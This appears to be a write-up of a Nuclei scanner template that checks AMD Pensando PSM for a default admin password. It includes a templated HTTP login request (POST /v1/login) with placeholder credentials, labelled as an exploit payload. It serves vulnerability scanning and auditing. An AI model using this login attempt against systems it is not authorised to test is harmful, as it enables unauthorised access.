# Nuclei Template: AMD Pensando PSM - Default Login
**Template ID:** pensando-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`pensando-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The AMD Pensando Policy and Services Manager used a default password for the admin account.This allowed instances to be accessed using the default credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
POST /v1/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}","tenant":"default"}
```

## References
- https://www.amd.com/en/solutions/data-center/networking.html
- https://arubanetworking.hpe.com/techdocs/Pensando/AMD_Pensando_PSM_for_DSS_Guide-1.72.1-T.pdf
